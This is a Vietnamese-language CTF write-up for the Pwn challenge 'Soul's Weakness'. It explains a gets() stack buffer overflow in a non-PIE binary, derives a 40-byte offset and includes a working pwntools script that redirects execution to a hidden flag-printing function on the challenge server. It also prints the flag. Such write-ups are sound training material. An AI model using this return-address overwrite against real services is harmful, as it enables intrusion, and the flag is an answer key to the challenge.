---
title: "Soul's Weakness"
category: "Pwn"
tags: ["stack-buffer-overflow", "gets", "unreachable-win-function", "non-pie"]
solve_date: "2026-10-09"
language: "vi"
---

# Soul's Weakness

**Flag:** `OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}`
**Dịch vụ:** `145.239.142.129:1337`. **Artifact:** `soul-stone.zip` (2860 B), chứa `soul` (16288 B, ELF 64-bit).

## Đề bài

Binary `soul` được tặng kèm và chạy tại cổng 1337 (Easy, 24 lời giải tại thời điểm giải). Chương trình chào người dùng bằng `gets()` rồi báo rằng Soul Stone vẫn bị phong ấn. Trong binary có hàm `soul_stone()` in cờ nhưng không nằm trên đường thực thi bình thường; mục tiêu là gọi được hàm đó.

## Phân tích

`r2 -q -c "iI~type,pic" soul` báo `type EXEC` và `pic false`: image load address cố định, không cần leak.

`main()` chỉ gọi `setvbuf` ba lần rồi `call sym.vault`. Tham chiếu tới `sym.soul_stone` là rỗng (`aa; axt @ sym.soul_stone` không in ra xref nào), nên `soul_stone()` tại `0x4011b6` không bao giờ được gọi theo luồng bình thường:

```text
0x004011be  lea rax, str._n___Soul_Stone_unlocked_ ; 0x402008 ; "\n[+] Soul Stone unlocked!"
0x004011c8  call sym.imp.puts
0x004011cd  lea rax, str.OWASPS0ul_St0ne_Buff3r_0v3rfl0w ; 0x402028
0x004011d7  call sym.imp.puts
0x004011e6  call sym.imp.fflush
0x004011ed  ret
```

Hàm `vault()` tại `0x4011ee` cấp frame và đọc tên:

```text
0x004011f6  4883ec20     sub rsp, 0x20
0x0040124a  488d45e0     lea rax, [rbp - 0x20]
0x00401256  e845feffff   call sym.imp.gets
```

Buffer ở `rbp-0x20`, return address ở `rbp+8`: cần 0x20 + 8 = 40 byte để tới chỗ ghi đè. `gets()` không kiểm tra độ dài.

Chuỗi cờ cũng tồn tại tĩnh trong `.rodata`, nên chỉ đọc file không đủ để kết luận:

```text
1   0x00002028 0x00402028 33  34   .rodata ascii OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}
```

Chính phản hồi của dịch vụ sau khi khai thác xác lập chuỗi đó là cờ của bài.

## Lời giải

Payload là 40 byte filler cộng địa chỉ little-endian của `soul_stone()` (48 byte ghi đè), gửi qua `sendline()` nên có `\n` kết thúc để `gets()` dừng:

```python
SOUL = 0x4011b6
OFFSET = 0x20 + 8  # buffer (rbp-0x20) + saved rbp -> return address
payload = b'A' * OFFSET + p64(SOUL)
```

Sau khi `gets()` trả về, `vault()` in `Hello, %s!` rồi dòng `The Soul Stone remains sealed...`, `pop rbp` / `ret` nhảy vào `0x4011b6` thay vì về `main()`. `soul_stone()` in `Soul Stone unlocked!` và dòng cờ, `fflush(stdout)` rồi `ret` vào stack đã hỏng — cờ đã được in ra trước nên điều đó không ảnh hưởng kết quả.

Ba byte `b6 11 40` của địa chỉ hiện lại trong lời chào (`%s` in tới NUL đầu tiên); phần cao của địa chỉ là các byte `00`, đúng như chuẩn của image non-PIE. Phản hồi ghi nhận trong phiên (chuỗi `A` được viết tắt trong log):

```text
[+] Response: b'\nHello, AAA…\xb6\x11@!\nThe Soul Stone remains sealed...\n\n[+] Soul Stone unlocked!\nOWASP{S0ul_St0ne_Buff3r_0v3rfl0w}\n'
```

## Kết quả

```text
OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}
```

Cờ đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.

## Tái hiện

Cần Python 3 và pwntools (phiên giải dùng pwntools 4.15.0).

```console
$ unzip soul-stone.zip
$ r2 -q -c "iI~type,pic" soul
$ r2 -q -c "aa; axt @ sym.soul_stone; iz~OWASP" soul
```

Lưu script dưới đây thành `exploit.py`, chạy `python exploit.py` khi dịch vụ ở `145.239.142.129:1337` reachable:

```python
from pwn import *

context.log_level = 'debug'
context.timeout = 25

SOUL = 0x4011b6
OFFSET = 0x20 + 8  # buffer (rbp-0x20) + saved rbp -> return address

HOST, PORT = '145.239.142.129', 1337

io = remote(HOST, PORT)
io.recvuntil(b'Enter your name: ')
payload = b'A' * OFFSET + p64(SOUL)
io.sendline(payload)
data = io.recvall(timeout=15)
log.success('Response: %r' % (data,))
io.close()
```

Offset 40 và địa chỉ `0x4011b6` đọc từ artifact `soul`; kiểm tra lại `sub rsp` và `lea rax,[rbp-…]` nếu binary đổi.
